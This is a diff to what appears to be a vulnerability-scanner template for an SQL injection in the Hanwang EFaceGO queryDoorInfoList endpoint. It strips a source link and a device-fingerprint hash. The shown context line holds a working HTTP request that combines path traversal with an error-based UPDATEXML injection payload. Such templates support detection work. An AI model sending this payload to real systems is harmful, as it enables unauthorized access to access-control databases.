@@ -3,12 +3,8 @@ info:
   name: 汉王EFaceGO queryDoorInfoList 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tvs2ok1ox94nf0ur'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tvs2ok1ox94nf0ur
-    fofa: icon_hash="1380907357"
 http:
 - raw:
   - 'GET /manage/m/..;aa/doorInfo/queryDoorInfoList.do?page=1&pageSize=10&mtId=1&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
